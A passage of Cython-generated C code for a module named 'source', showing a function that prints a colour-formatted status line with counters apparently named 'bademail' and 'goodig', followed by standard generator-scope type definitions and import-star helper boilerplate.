  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 28, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__58);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__58);
  PyTuple_SET_ITEM(__pyx_t_1, 29, __pyx_kp_u__58);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_white); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 30, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__62);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 11;
  __Pyx_GIVEREF(__pyx_kp_u__62);
  PyTuple_SET_ITEM(__pyx_t_1, 31, __pyx_kp_u__62);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_red); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 32, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__17);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__17);
  PyTuple_SET_ITEM(__pyx_t_1, 33, __pyx_kp_u__17);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_bademail); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 34, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__63);
  __pyx_t_4 += 11;
  __Pyx_GIVEREF(__pyx_kp_u__63);
  PyTuple_SET_ITEM(__pyx_t_1, 35, __pyx_kp_u__63);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cyan); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 36, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_);
  PyTuple_SET_ITEM(__pyx_t_1, 37, __pyx_kp_u_);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_cyan); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 38, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__58);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__58);
  PyTuple_SET_ITEM(__pyx_t_1, 39, __pyx_kp_u__58);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_white); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 40, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__61);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 12;
  __Pyx_GIVEREF(__pyx_kp_u__61);
  PyTuple_SET_ITEM(__pyx_t_1, 41, __pyx_kp_u__61);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_DY6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 42, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__17);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__17);
  PyTuple_SET_ITEM(__pyx_t_1, 43, __pyx_kp_u__17);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_goodig); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 44, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_B_P_Ts7);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 50;
  __Pyx_GIVEREF(__pyx_kp_u_B_P_Ts7);
  PyTuple_SET_ITEM(__pyx_t_1, 45, __pyx_kp_u_B_P_Ts7);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 46, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.pppp", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_freelist_6source___pyx_scope_struct__genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct__genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct__genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct__genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct__genexpr[--__pyx_freecount_6source___pyx_scope_struct__genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct__genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct__genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct__genexpr[__pyx_freecount_6source___pyx_scope_struct__genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct__genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct__genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct__genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct__genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct__genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct__genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_freelist_6source___pyx_scope_struct_1_genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct_1_genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct_1_genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct_1_genexpr[--__pyx_freecount_6source___pyx_scope_struct_1_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct_1_genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct_1_genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct_1_genexpr[__pyx_freecount_6source___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct_1_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct_1_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct_1_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct_1_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct_1_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct_1_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_freelist_6source___pyx_scope_struct_2_genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct_2_genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct_2_genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct_2_genexpr[--__pyx_freecount_6source___pyx_scope_struct_2_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct_2_genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct_2_genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct_2_genexpr[__pyx_freecount_6source___pyx_scope_struct_2_genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct_2_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct_2_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct_2_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct_2_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct_2_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct_2_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct_2_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

static int __pyx_import_star_set(PyObject *o, PyObject* py_name, char *name) {
  static const char* internal_type_names[] = {
    "__pyx_ctuple_double",
    "__pyx_ctuple_double_struct",
    "__pyx_ctuple_long",
    "__pyx_ctuple_long__and_long",
    "__pyx_ctuple_long__and_long__and_long__and_long__and_long",
    "__pyx_ctuple_long__and_long__and_long__and_long__and_long_struct",
    "__pyx_ctuple_long__and_long_struct",
    "__pyx_ctuple_long_struct",
    "__pyx_scope_struct_1_genexpr",
    "__pyx_scope_struct_2_genexpr",
    "__pyx_scope_struct__genexpr",
    0
  };
  const char** type_name = internal_type_names;
  while (*type_name) {
    if (__Pyx_StrEq(name, *type_name)) {
      PyErr_Format(PyExc_TypeError, "Cannot overwrite C type %s", name);
      goto bad;
    }
    type_name++;
  }
  if (0);
  else {
    if (PyObject_SetAttr(__pyx_m, py_name, o) < 0) goto bad;
  }
  return 0;
  bad:
  return -1;
}

static int
__Pyx_import_all_from(PyObject *locals, PyObject *v)
{
    PyObject *all = PyObject_GetAttrString(v, "__all__");
    PyObject *dict, *name, *value;
    int skip_leading_underscores = 0;
    int pos, err;
    if (all == NULL) {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError))
            return -1;
        PyErr_Clear();
        dict = PyObject_GetAttrString(v, "__dict__");
        if (dict == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError))
                return -1;
            PyErr_SetString(PyExc_ImportError,
            "from-import-* object has no __dict__ and no __all__");
            return -1;
        }
#if PY_MAJOR_VERSION < 3
        all = PyObject_CallMethod(dict, (char *)"keys", NULL);
#else
        all = PyMapping_Keys(dict);
#endif
        Py_DECREF(dict);
        if (all == NULL)
            return -1;
        skip_leading_underscores = 1;
    }
    for (pos = 0, err = 0; ; pos++) {
        name = PySequence_GetItem(all, pos);
        if (name == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_IndexError))
                err = -1;
            else
                PyErr_Clear();
            break;
        }
        if (skip_leading_underscores &&
#if PY_MAJOR_VERSION < 3
            likely(PyString_Check(name)) &&
            PyString_AS_STRING(name)[0] == '_')
#else
            likely(PyUnicode_Check(name)) &&
            likely(__Pyx_PyUnicode_GET_LENGTH(name)) &&
            __Pyx_PyUnicode_READ_CHAR(name, 0) == '_')
#endif
        {
            Py_DECREF(name);
            continue;
        }
        value = PyObject_GetAttr(v, name);
        if (value == NULL)
            err = -1;
        else if (PyDict_CheckExact(locals))
            err = PyDict_SetItem(locals, name, value);
        else
            err = PyObject_SetItem(locals, name, value);
        Py_DECREF(name);
        Py_XDECREF(value);
        if (err != 0)
            break;
    }
    Py_DECREF(all);
    return err;
}
static int __pyx_import_star(PyObject* m) {
    int i;
    int ret = -1;
    char* s;
    PyObject *locals = 0;
    PyObject *list = 0;
#if PY_MAJOR_VERSION >= 3
    PyObject *utf8_name = 0;
#endif
    PyObject *name;
    PyObject *item;
    locals = PyDict_New();              if (!locals) goto bad;
    if (__Pyx_import_all_from(locals, m) < 0) goto bad;
    list = PyDict_Items(locals);        if (!list) goto bad;
    for(i=0; i<PyList_GET_SIZE(list); i++) {
        name = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 0);
        item = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 1);
#if PY_MAJOR_VERSION >= 3
